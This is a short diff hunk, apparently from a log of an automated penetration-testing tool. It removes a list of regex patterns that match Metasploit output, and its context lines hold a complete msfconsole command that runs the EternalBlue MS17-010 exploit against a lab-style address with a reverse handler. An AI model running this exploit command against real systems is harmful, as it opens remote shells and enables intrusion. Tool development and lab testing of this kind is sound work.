@@ -4061,9 +4061,6 @@ exclude any explanations or discussions from the response. Present the list of
 regex patterns in an json array.
 
 Command: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.10.16.4; run"
-['.*\\[\\*\\] Exploit completed, but no session was created\\.', '.*Meterpreter session .* opened .*', '.*\\[\\*\\] Started reverse TCP handler on .*', '.*Exploit failed: .*', '.*is not a valid option for this module\\.', '.*\\[\\*\\] 
-10\\.10\\.10\\.40:445 - Host is likely VULNERABLE to MS17-010!.*', '.*\\[!\\] 10\\.10\\.10\\.40:445 - Unable to find accessible named pipe!.*', '.*\\[-\\] 10\\.10\\.10\\.40:445 - \\S+ - Exploit failed: .*', '.*\\[\\+\\] 
-10\\.10\\.10\\.40 \\(RHOST: \\S+\\) \\- The target is vulnerable\\.', '.*msf[5|6] >\\s*$', '.*msf[5|6] \\([^)]+\\) >\\s*$', <class 'pexpect.exceptions.TIMEOUT'>, <class 'pexpect.exceptions.EOF'>]
 Before:  
 After:  This copy of metasploit-framework is more than two weeks old.
  Consider running 'msfupdate' to update to the latest version.
